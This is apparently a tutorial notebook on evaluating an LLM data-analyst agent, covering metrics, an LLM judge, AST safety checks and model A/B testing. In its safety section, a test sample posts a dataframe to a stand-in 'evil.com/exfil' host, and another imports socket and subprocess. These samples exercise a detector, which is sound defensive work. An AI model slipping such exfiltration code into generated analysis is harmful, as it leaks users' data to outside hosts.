# Lesson 6: Evaluation Framework

## What You'll Learn

1. **Why evaluation matters** — You can't improve what you can't measure
2. **Deterministic metrics** — Exact match, substring, numeric comparison
3. **LLM-as-Judge** — Using a second LLM to grade open-ended responses
4. **Safety evaluation** — AST-based analysis of generated code
5. **The eval harness** — Running test suites and tracking regressions
6. **A/B testing across providers** — Comparing GPT vs Claude on the same test set

---

## Why Evaluation is Non-Negotiable

Without evaluation, agent development is **vibes-based engineering**:
- "It seems to work" is not a quality standard
- You change a prompt and break 3 other cases without knowing
- You can't compare models objectively

Production-grade agents need **eval-driven development**:
```
1. Write eval cases FIRST (what should the agent get right?)
2. Build/change the agent
3. Run the eval suite
4. Only ship if scores improve (or at least don't regress)
```

### Types of Evaluation

| Type | How | Best For | Cost |
|------|-----|----------|------|
| **Deterministic** | String/numeric comparison | Questions with known answers | Free |
| **LLM-as-Judge** | Second LLM grades the answer | Open-ended quality assessment | $$ |
| **Safety** | AST analysis of generated code | Detecting dangerous patterns | Free |
| **Human-in-the-loop** | Expert reviews sample outputs | Ground truth calibration | $$$ |

---

## Setup

In [ ]:
import os
import sys
from pathlib import Path
from dotenv import load_dotenv
import nest_asyncio
nest_asyncio.apply()


for _env_candidate in (Path('.env'), Path('../.env')):
    if _env_candidate.exists():
        load_dotenv(_env_candidate)
        break

# LM Studio OpenAI-compatible local setup
if os.getenv("LMSTUDIO_BASE_URL") and not os.getenv("OPENAI_BASE_URL"):
    os.environ["OPENAI_BASE_URL"] = os.getenv("LMSTUDIO_BASE_URL").rstrip("/") + "/v1"
if os.getenv("LMSTUDIO_BASE_URL") and not os.getenv("OPENAI_API_KEY"):
    os.environ["OPENAI_API_KEY"] = "lm-studio"
sys.path.insert(0, str(Path("..").resolve() / "src"))

import pandas as pd
import duckdb
from pydantic_ai import Agent, RunContext, ModelRetry

from analyst.evaluation.metrics import (
    substring_match,
    numeric_match,
    keyword_coverage,
    code_safety_score,
    response_quality_score,
)
from analyst.evaluation.harness import EvalCase, EvalResult, EvalHarness

DATA_DIR = str(Path("../data").resolve())
sales_df = pd.read_csv(f"{DATA_DIR}/sample_sales.csv")
employees_df = pd.read_csv(f"{DATA_DIR}/sample_employees.csv")

print(f"Loaded: sales ({sales_df.shape}), employees ({employees_df.shape})")

---

## Part 1: Deterministic Metrics — The Foundation

These metrics are fast, free, and reproducible. Use them whenever
you know what the correct answer should be.

In [ ]:
# --- Substring match ---
# Does the expected answer appear somewhere in the agent's response?

agent_answer = "The total revenue across all regions is $45,230.50, with North leading at $15,400."

print("Substring match tests:")
print(f"  Contains '45,230.50': {substring_match(agent_answer, '45,230.50')}")
print(f"  Contains 'North':     {substring_match(agent_answer, 'North')}")
print(f"  Contains 'South':     {substring_match(agent_answer, 'South')}")
print(f"  Case insensitive:     {substring_match(agent_answer, 'TOTAL REVENUE')}")

In [ ]:
# --- Numeric match ---
# Extracts numbers from text and checks if any are close to expected
# Crucial for data analysis where exact formatting varies

answers = [
    "The average salary is $72,500",
    "Average: approximately 72.5k",
    "I computed the mean salary to be 72500.00",
    "The salary is around seventy thousand",  # Won't match — no digits
]

print("Numeric match (expected: 72500, tolerance: 5%):")
for a in answers:
    result = numeric_match(a, expected_value=72500, tolerance=0.05)
    print(f"  {result:>5} | {a}")

print("\nWith tighter tolerance (1%):")
print(f"  '72,500':  {numeric_match('$72,500', 72500, tolerance=0.01)}")
print(f"  '73,000':  {numeric_match('$73,000', 72500, tolerance=0.01)}")

In [ ]:
# --- Keyword coverage ---
# What fraction of required keywords appear in the answer?

answer = "Electronics had the highest revenue at $28,000, followed by Home products at $17,230."
keywords = ["Electronics", "Home", "revenue", "highest"]

coverage = keyword_coverage(answer, keywords)
print(f"Keyword coverage: {coverage:.0%} ({int(coverage * len(keywords))}/{len(keywords)})")

# Check each keyword individually
for kw in keywords:
    found = kw.lower() in answer.lower()
    print(f"  {'[OK]' if found else '[  ]'} {kw}")

# With a keyword that's NOT present
keywords_v2 = ["Electronics", "Home", "revenue", "quarterly"]  # 'quarterly' is missing
coverage_v2 = keyword_coverage(answer, keywords_v2)
print(f"\nWith missing keyword: {coverage_v2:.0%}")

### When Deterministic Metrics Fail

Deterministic metrics break down when:
- The answer is correct but phrased differently ("$45K" vs "$45,000")
- The answer includes extra correct info that confuses substring matching
- The question is open-ended ("What trends do you see?")

This is where **LLM-as-Judge** comes in.

---

## Part 2: LLM-as-Judge — Grading Open-Ended Responses

In [ ]:
# -----------------------------------------------------------------
# LLM-as-Judge: Use a second LLM to evaluate response quality
# -----------------------------------------------------------------
from pydantic import BaseModel, Field


class JudgeVerdict(BaseModel):
    """Structured output from the judge LLM."""
    score: float = Field(ge=0, le=1, description="Quality score: 0=wrong, 0.5=partial, 1=perfect")
    correct: bool = Field(description="Is the answer factually correct?")
    reasoning: str = Field(description="Brief explanation of the score")
    missing_info: list[str] = Field(default_factory=list, description="Important info not in the answer")


judge_agent = Agent(
    "openai:local-model",
    output_type=JudgeVerdict,
    system_prompt=(
        "You are an evaluation judge for a data analyst agent.\n"
        "Given a question, expected answer, and agent's actual answer, score the response.\n\n"
        "Scoring rubric:\n"
        "- 1.0: Perfect — correct answer with specific numbers\n"
        "- 0.8: Good — correct answer, minor formatting issues\n"
        "- 0.5: Partial — some correct information but incomplete\n"
        "- 0.2: Poor — mostly wrong but shows understanding of the data\n"
        "- 0.0: Wrong — incorrect or irrelevant answer\n\n"
        "Be strict about numbers — if the expected answer has a specific value, "
        "the agent's answer must include it or a very close approximation."
    ),
)

print("Judge agent ready.")

In [ ]:
# Test the judge on various quality levels

test_cases = [
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "The total revenue across all products and regions is $45,230.50.",
        "label": "Perfect answer",
    },
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "Revenue is approximately forty-five thousand dollars.",
        "label": "Vague answer",
    },
    {
        "question": "What is the total revenue in the sales dataset?",
        "expected": "The total revenue is $45,230.50",
        "agent_answer": "The total cost is $32,100.",
        "label": "Wrong metric",
    },
]

for tc in test_cases:
    prompt = (
        f"Question: {tc['question']}\n"
        f"Expected answer: {tc['expected']}\n"
        f"Agent's answer: {tc['agent_answer']}"
    )
    verdict = judge_agent.run_sync(prompt)
    v = verdict.output
    print(f"\n--- {tc['label']} ---")
    print(f"  Score: {v.score:.1f} | Correct: {v.correct}")
    print(f"  Reasoning: {v.reasoning}")
    if v.missing_info:
        print(f"  Missing: {v.missing_info}")

### LLM-as-Judge: Pros and Cons

| Pro | Con |
|-----|-----|
| Handles open-ended questions | Non-deterministic (same input, different scores) |
| Can assess quality, not just correctness | Costs money (another LLM call per eval) |
| Catches nuanced errors | Judge can be wrong (especially with math) |
| Structured output makes it programmatic | Slower than deterministic metrics |

**Best practice**: Use deterministic metrics first. Only fall back to LLM-as-Judge
for cases where you can't define a clear expected answer.

---

## Part 3: Safety Evaluation — Is the Generated Code Dangerous?

In [ ]:
# -----------------------------------------------------------------
# Safety evaluation uses AST (Abstract Syntax Tree) analysis
# to detect dangerous patterns WITHOUT executing the code
# -----------------------------------------------------------------

# Safe code: standard pandas analysis
safe_code = """
import pandas as pd
import numpy as np

df = pd.read_csv('sales.csv')
total = df['revenue'].sum()
mean_rev = df.groupby('region')['revenue'].mean()
print(f'Total revenue: {total}')
print(mean_rev)
"""

result = code_safety_score(safe_code)
print("Safe code analysis:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

In [ ]:
# Unsafe code: network access attempt
unsafe_network = """
import pandas as pd
import requests

df = pd.read_csv('data.csv')
requests.post('https://evil.com/exfil', json=df.to_dict())
"""

result = code_safety_score(unsafe_network)
print("Network access attempt:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

In [ ]:
# Unsafe code: infinite loop
unsafe_loop = """
import pandas as pd

while True:
    df = pd.DataFrame({'a': range(1000000)})
"""

result = code_safety_score(unsafe_loop)
print("Infinite loop detection:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
print(f"  Issues: {result['issues']}")

In [ ]:
# Multiple issues at once
multi_unsafe = """
import socket
import subprocess
import pandas as pd

while True:
    pass
"""

result = code_safety_score(multi_unsafe)
print("Multiple safety violations:")
print(f"  Safe: {result['safe']}")
print(f"  Score: {result['score']}")
for issue in result['issues']:
    print(f"    - {issue}")

# Syntax error
bad_syntax = "def foo(:\n    return"
result = code_safety_score(bad_syntax)
print(f"\nSyntax error: Safe={result['safe']}, Score={result['score']}")

### The Safety Evaluation Pipeline

In production, safety checks happen at multiple levels:

```
LLM generates code
       |
       v
[1. AST static analysis]  ← Fast, free, catches obvious issues
       |
       v
[2. Sandbox execution]    ← Docker container with no network
       |
       v
[3. Output validation]    ← Check stdout size, file types, etc.
       |
       v
    Return result
```

---

## Part 4: Response Quality Heuristics

In [ ]:
# -----------------------------------------------------------------
# Heuristic quality checks — fast sanity checks on any answer
# -----------------------------------------------------------------

answers = [
    # Good: specific, right length, no hedging
    "The total revenue is $45,230.50 across 40 transactions. North region leads with $15,400 (34%), followed by East at $12,300 (27%).",
    
    # Bad: too short
    "Revenue is high.",
    
    # Bad: no numbers
    "The revenue varies across regions, with some performing better than others. The data shows interesting patterns.",
    
    # Bad: too vague
    "I think the revenue is approximately around $45,000, maybe possibly more. Around that area, I think.",
]

labels = ["Good answer", "Too short", "No numbers", "Too vague"]

for label, answer in zip(labels, answers):
    result = response_quality_score(answer)
    print(f"\n{label}:")
    print(f"  Score: {result['score']:.2f}")
    print(f"  Words: {result['word_count']}")
    if result['issues']:
        for issue in result['issues']:
            print(f"    ! {issue}")

---

## Part 5: The Eval Harness — Running Full Test Suites

Now we combine everything into a systematic evaluation pipeline.

### Step 1: Define eval cases

Good eval suites have:
- **Coverage**: different question types (aggregation, comparison, trend)
- **Difficulty levels**: easy (single lookup) to hard (multi-step reasoning)
- **Known answers**: computed independently (e.g., with pandas)

In [ ]:
# -----------------------------------------------------------------
# First, compute ground truth answers with pandas
# (We need to know the RIGHT answers to evaluate the agent)
# -----------------------------------------------------------------

total_revenue = sales_df['revenue'].sum()
total_rows = len(sales_df)
top_product = sales_df.groupby('product')['revenue'].sum().idxmax()
top_region = sales_df.groupby('region')['revenue'].sum().idxmax()
avg_salary = employees_df['salary'].mean()
n_departments = employees_df['department'].nunique()

print("Ground truth values:")
print(f"  Total revenue: {total_revenue}")
print(f"  Total rows: {total_rows}")
print(f"  Top product by revenue: {top_product}")
print(f"  Top region by revenue: {top_region}")
print(f"  Average salary: {avg_salary}")
print(f"  Number of departments: {n_departments}")

In [ ]:
# -----------------------------------------------------------------
# Define eval cases across difficulty levels and categories
# -----------------------------------------------------------------

eval_cases = [
    # Easy: direct lookups
    EvalCase(
        question="How many rows are in the sales dataset?",
        expected_answer=str(total_rows),
        expected_keywords=["40"],
        difficulty="easy",
        category="lookup",
    ),
    EvalCase(
        question="How many departments are in the employees dataset?",
        expected_answer=str(n_departments),
        expected_keywords=[str(n_departments)],
        difficulty="easy",
        category="lookup",
    ),
    
    # Medium: single aggregation
    EvalCase(
        question="What is the total revenue in the sales data?",
        expected_answer=str(total_revenue),
        expected_keywords=["revenue"],
        difficulty="medium",
        category="aggregation",
    ),
    EvalCase(
        question="What is the average employee salary?",
        expected_answer=str(round(avg_salary)),
        expected_keywords=["salary"],
        difficulty="medium",
        category="aggregation",
    ),
    
    # Medium: comparison
    EvalCase(
        question="Which product has the highest total revenue?",
        expected_answer=top_product,
        expected_keywords=[top_product, "revenue"],
        difficulty="medium",
        category="comparison",
    ),
    EvalCase(
        question="Which region generates the most revenue?",
        expected_answer=top_region,
        expected_keywords=[top_region],
        difficulty="medium",
        category="comparison",
    ),
    
    # Hard: multi-step reasoning
    EvalCase(
        question="What is the profit margin (revenue - cost) / revenue for each category? Which is more profitable?",
        expected_answer="Electronics",  # or whichever is higher
        expected_keywords=["margin", "Electronics", "Home"],
        difficulty="hard",
        category="multi_step",
    ),
    EvalCase(
        question="Is there a correlation between employee salary and performance_score? What is the correlation coefficient?",
        expected_answer="correlation",
        expected_keywords=["correlation", "salary", "performance"],
        difficulty="hard",
        category="analysis",
    ),
]

print(f"Defined {len(eval_cases)} eval cases:")
for case in eval_cases:
    print(f"  [{case.difficulty:>6}] [{case.category:>11}] {case.question[:60]}")

### Step 2: Build the agent under test

In [ ]:
# -----------------------------------------------------------------
# Build a test agent — simpler than the full agent, focused on eval
# -----------------------------------------------------------------
from dataclasses import dataclass, field


@dataclass
class EvalDeps:
    tables: dict[str, pd.DataFrame] = field(default_factory=dict)
    tool_call_count: int = 0
    token_estimate: int = 0


eval_agent = Agent(
    "openai:local-model",
    deps_type=EvalDeps,
    system_prompt=(
        "You are a data analyst. Answer questions about datasets using SQL.\n"
        "Always include specific numbers in your answer.\n"
        "Be concise — 1-3 sentences."
    ),
    retries=2,
)


@eval_agent.system_prompt
def add_table_context(ctx: RunContext[EvalDeps]) -> str:
    lines = ["\nAvailable tables:"]
    for name, df in ctx.deps.tables.items():
        cols = ", ".join(f"{c} ({df[c].dtype})" for c in df.columns)
        lines.append(f"  '{name}': {len(df)} rows | {cols}")
    return "\n".join(lines)


@eval_agent.tool
def run_sql(ctx: RunContext[EvalDeps], query: str) -> str:
    """Run SQL against available tables using DuckDB."""
    ctx.deps.tool_call_count += 1
    conn = duckdb.connect()
    try:
        for name, df in ctx.deps.tables.items():
            conn.register(name, df)
        result = conn.execute(query).fetchdf()
        return result.to_string()
    except Exception as e:
        raise ModelRetry(f"SQL error: {e}")
    finally:
        conn.close()


print("Eval agent ready.")

In [ ]:
# -----------------------------------------------------------------
# Create the adapter function that the harness expects
# agent_fn(question) -> (answer, tool_calls, tokens)
# -----------------------------------------------------------------

def run_eval_agent(question: str) -> tuple[str, int, int]:
    """Adapter: run the agent and return (answer, tool_calls, tokens)."""
    deps = EvalDeps(
        tables={"sales": sales_df, "employees": employees_df},
    )
    result = eval_agent.run_sync(question, deps=deps)
    
    # Count tool calls from message history
    tool_calls = deps.tool_call_count
    
    # Estimate tokens from message lengths
    token_estimate = sum(
        len(str(m)) // 4  # rough 4-chars-per-token estimate
        for m in result.all_messages()
    )
    
    return result.output, tool_calls, token_estimate


# Quick test
answer, tools, tokens = run_eval_agent("How many rows are in the sales table?")
print(f"Answer: {answer}")
print(f"Tool calls: {tools}, Estimated tokens: {tokens}")

### Step 3: Run the eval suite

In [ ]:
# -----------------------------------------------------------------
# Run the full eval suite
# -----------------------------------------------------------------

harness = EvalHarness()

print("Running evaluation suite...\n")
summary = harness.run_suite(eval_cases, run_eval_agent, verbose=True)

print(f"\n{'='*60}")
print(f"RESULTS: {summary.passed}/{summary.total_cases} passed ({summary.accuracy:.0%})")
print(f"Average latency: {summary.avg_latency_ms:.0f}ms")
print(f"Average tokens: {summary.avg_tokens:.0f}")
print(f"Average tool calls: {summary.avg_tool_calls:.1f}")
print(f"Estimated cost: ${summary.total_cost_usd:.4f}")

In [ ]:
# -----------------------------------------------------------------
# Drill into results by category and difficulty
# -----------------------------------------------------------------

print("\nBy Category:")
for cat, stats in summary.by_category.items():
    pct = stats['passed'] / stats['total'] * 100
    print(f"  {cat:>12}: {stats['passed']}/{stats['total']} ({pct:.0f}%)")

print("\nBy Difficulty:")
for diff, stats in summary.by_difficulty.items():
    pct = stats['passed'] / stats['total'] * 100
    print(f"  {diff:>8}: {stats['passed']}/{stats['total']} ({pct:.0f}%)")

# Show failures in detail
failures = [r for r in harness.results if not r.correct]
if failures:
    print(f"\nFailed cases ({len(failures)}):")
    for r in failures:
        print(f"\n  Q: {r.case.question[:70]}")
        print(f"  Expected: {r.case.expected_answer}")
        print(f"  Got: {r.agent_answer[:100]}")
        if r.keyword_matches:
            missed = [k for k, v in r.keyword_matches.items() if not v]
            if missed:
                print(f"  Missing keywords: {missed}")
        if r.error:
            print(f"  Error: {r.error}")
else:
    print("\nAll cases passed!")

In [ ]:
# -----------------------------------------------------------------
# Save results for tracking over time
# -----------------------------------------------------------------
import json

results_path = Path("../data/eval_results_gpt4o_mini.json")
harness.save_results(results_path)
print(f"Results saved to: {results_path}")

# Preview the saved data
saved = json.loads(results_path.read_text())
print(f"\nSaved {len(saved)} results. First entry:")
print(json.dumps(saved[0], indent=2)[:300])

---

## Part 6: A/B Testing Across Providers

One of the most valuable uses of eval: objectively comparing models.

Run the same test suite against different providers to find the best
cost/quality tradeoff for your use case.

In [ ]:
# -----------------------------------------------------------------
# A/B test: Build agent factories for different models
# -----------------------------------------------------------------

def make_eval_agent_fn(model: str):
    """Factory: create an eval adapter for any model."""
    
    test_agent = Agent(
        model,
        deps_type=EvalDeps,
        system_prompt=(
            "You are a data analyst. Answer questions about datasets using SQL.\n"
            "Always include specific numbers in your answer. Be concise."
        ),
        retries=2,
    )
    
    @test_agent.system_prompt
    def add_context(ctx: RunContext[EvalDeps]) -> str:
        lines = ["\nAvailable tables:"]
        for name, df in ctx.deps.tables.items():
            cols = ", ".join(f"{c} ({df[c].dtype})" for c in df.columns)
            lines.append(f"  '{name}': {len(df)} rows | {cols}")
        return "\n".join(lines)
    
    @test_agent.tool
    def query(ctx: RunContext[EvalDeps], sql: str) -> str:
        """Run SQL query against available tables."""
        ctx.deps.tool_call_count += 1
        conn = duckdb.connect()
        try:
            for name, df in ctx.deps.tables.items():
                conn.register(name, df)
            return conn.execute(sql).fetchdf().to_string()
        except Exception as e:
            raise ModelRetry(f"SQL error: {e}")
        finally:
            conn.close()
    
    def agent_fn(question: str) -> tuple[str, int, int]:
        deps = EvalDeps(tables={"sales": sales_df, "employees": employees_df})
        result = test_agent.run_sync(question, deps=deps)
        tokens = sum(len(str(m)) // 4 for m in result.all_messages())
        return result.output, deps.tool_call_count, tokens
    
    return agent_fn


print("Agent factory ready. Use make_eval_agent_fn('model') to create test agents.")

In [ ]:
# -----------------------------------------------------------------
# Run A/B test on a subset of cases (to save cost)
# Uncomment the models you have API keys for
# -----------------------------------------------------------------

models_to_test = [
    "openai:local-model",
    # "openai:gpt-4o",                        # More expensive
    # "anthropic:claude-3-5-haiku-latest",     # Needs ANTHROPIC_API_KEY
]

# Use a smaller subset for A/B testing (saves cost)
ab_cases = eval_cases[:4]  # Just easy + medium cases

ab_results = {}
for model in models_to_test:
    print(f"\n{'='*50}")
    print(f"Testing: {model}")
    print(f"{'='*50}")
    
    harness = EvalHarness()
    agent_fn = make_eval_agent_fn(model)
    summary = harness.run_suite(ab_cases, agent_fn, verbose=True)
    ab_results[model] = summary
    
    print(f"\nAccuracy: {summary.accuracy:.0%} | Latency: {summary.avg_latency_ms:.0f}ms | Cost: ${summary.total_cost_usd:.4f}")

In [ ]:
# -----------------------------------------------------------------
# Compare models side-by-side
# -----------------------------------------------------------------

if len(ab_results) > 1:
    print(f"\n{'Model':<35} {'Accuracy':>8} {'Latency':>10} {'Tokens':>8} {'Cost':>10}")
    print("-" * 75)
    for model, summary in ab_results.items():
        print(
            f"{model:<35} {summary.accuracy:>7.0%} "
            f"{summary.avg_latency_ms:>8.0f}ms "
            f"{summary.avg_tokens:>8.0f} "
            f"${summary.total_cost_usd:>8.4f}"
        )
else:
    model = list(ab_results.keys())[0]
    s = ab_results[model]
    print(f"\nSingle model tested: {model}")
    print(f"  Accuracy: {s.accuracy:.0%}")
    print(f"  Avg latency: {s.avg_latency_ms:.0f}ms")
    print(f"  Avg tokens: {s.avg_tokens:.0f}")
    print(f"  Total cost: ${s.total_cost_usd:.4f}")
    print("\nUncomment more models in the cell above to see a comparison table.")

---

## Part 7: Combining Metrics — The Full Evaluation Pipeline

In [ ]:
# -----------------------------------------------------------------
# Full eval pipeline: deterministic + quality + safety + judge
# -----------------------------------------------------------------

def full_evaluation(
    question: str,
    expected_answer: str,
    expected_keywords: list[str],
    agent_answer: str,
    code_generated: str = "",
    use_judge: bool = True,
) -> dict:
    """Run all evaluation metrics on a single case."""
    results = {}
    
    # 1. Deterministic metrics
    results["substring_match"] = substring_match(agent_answer, expected_answer)
    results["keyword_coverage"] = keyword_coverage(agent_answer, expected_keywords)
    
    # Try numeric match if expected answer looks like a number
    try:
        expected_num = float(expected_answer.replace(",", ""))
        results["numeric_match"] = numeric_match(agent_answer, expected_num)
    except ValueError:
        results["numeric_match"] = None  # Not a numeric answer
    
    # 2. Quality heuristics
    results["quality"] = response_quality_score(agent_answer)
    
    # 3. Safety (if code was generated)
    if code_generated:
        results["safety"] = code_safety_score(code_generated)
    
    # 4. LLM-as-Judge (optional, costs money)
    if use_judge:
        prompt = (
            f"Question: {question}\n"
            f"Expected answer: {expected_answer}\n"
            f"Agent's answer: {agent_answer}"
        )
        verdict = judge_agent.run_sync(prompt)
        results["judge"] = {
            "score": verdict.output.score,
            "correct": verdict.output.correct,
            "reasoning": verdict.output.reasoning,
        }
    
    # Composite score (weighted average)
    scores = []
    if results["substring_match"]:
        scores.append(1.0)
    else:
        scores.append(0.0)
    scores.append(results["keyword_coverage"])
    scores.append(results["quality"]["score"])
    if "judge" in results:
        scores.append(results["judge"]["score"])
    
    results["composite_score"] = sum(scores) / len(scores)
    
    return results


# Run full evaluation on an example
eval_result = full_evaluation(
    question="What is the total revenue?",
    expected_answer=str(total_revenue),
    expected_keywords=["revenue", "total"],
    agent_answer=f"The total revenue across all transactions is ${total_revenue:,.2f}, spanning all 4 regions.",
    code_generated="import pandas as pd\ndf = pd.read_csv('sales.csv')\nprint(df['revenue'].sum())",
    use_judge=True,
)

print("Full evaluation results:")
print(f"  Substring match: {eval_result['substring_match']}")
print(f"  Keyword coverage: {eval_result['keyword_coverage']:.0%}")
print(f"  Numeric match: {eval_result['numeric_match']}")
print(f"  Quality score: {eval_result['quality']['score']:.2f}")
print(f"  Safety: {eval_result.get('safety', {}).get('safe', 'N/A')}")
print(f"  Judge score: {eval_result.get('judge', {}).get('score', 'N/A')}")
print(f"  Judge reasoning: {eval_result.get('judge', {}).get('reasoning', 'N/A')}")
print(f"\n  COMPOSITE SCORE: {eval_result['composite_score']:.2f}")

---

## Summary

| Metric | Type | Cost | Best For |
|--------|------|------|----------|
| `substring_match` | Deterministic | Free | Known-answer questions |
| `numeric_match` | Deterministic | Free | Numeric answers with tolerance |
| `keyword_coverage` | Deterministic | Free | Ensuring key concepts appear |
| `response_quality_score` | Heuristic | Free | Quick sanity checks |
| `code_safety_score` | AST analysis | Free | Detecting dangerous code |
| LLM-as-Judge | LLM call | ~$0.001/eval | Open-ended quality grading |
| `EvalHarness` | Framework | Varies | Running full test suites |

### Production Patterns

1. **Eval-driven development** — Write eval cases before changing the agent
2. **Layer your metrics** — Deterministic first, LLM-judge only when needed
3. **Track over time** — Save results to JSON/database, plot trends
4. **A/B test models** — Same eval suite, different providers, objective comparison
5. **Safety is non-negotiable** — Every code-generating agent needs safety checks
6. **Composite scores** — Combine metrics into a single number for quick comparison

### The Eval Workflow

```
Define eval cases (with ground truth)
        |
        v
Run agent on each case
        |
        v
Score: deterministic + heuristic + safety + judge
        |
        v
Analyze: by category, by difficulty, failures
        |
        v
Save results & compare to previous runs
```

**Next: Lesson 7 — Observability & Debugging (tracing every step of agent execution)**

---

## Exercises

1. **Add 10 more eval cases** — Cover edge cases: empty results, ambiguous questions, multi-table joins
2. **Build a regression checker** — Compare two eval runs and flag any cases that got worse
3. **Custom judge rubric** — Create specialized judges for different question types (aggregation vs trend analysis)
4. **Cost-adjusted scoring** — Penalize answers that use too many tool calls or tokens
5. **Eval dashboard** — Use matplotlib to visualize eval results across models and over time